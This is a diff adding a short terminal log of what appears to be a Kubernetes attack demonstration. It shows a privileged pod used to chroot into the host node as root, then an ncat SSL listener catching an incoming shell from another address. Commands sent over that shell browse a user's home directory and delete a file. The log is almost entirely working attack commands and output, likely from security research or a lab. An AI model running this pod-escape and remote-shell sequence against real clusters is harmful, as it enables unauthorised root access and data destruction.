@@ -1,0 +1,24 @@
+ubuntu@test-master:~$ kubectl exec -it -n spark-operator everything-allowed-exec-pod-4  -- chroot /host bash
+root@test-master2:/# ip -4 addr show | grep inet
+    inet 127.0.0.1/8 scope host lo
+    inet 172.22.14.33/24 metric 100 brd 172.22.14.255 scope global dynamic ens3
+root@test-master2:/# ncat --ssl -vlp 8080
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 0AF0 C746 E4EE 0BBC DB94 F180 FB7A 51CF D61C D3BD
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 192.168.101.99.
+Ncat: Connection from 192.168.101.99:51018.
+cd /host/
+cd home
+cd ubuntu
+ls
+calico-bpf.yml
+disable_proxy.txt
+message2
+pod_network_setup.txt
+test
+rm message2
+exit
+
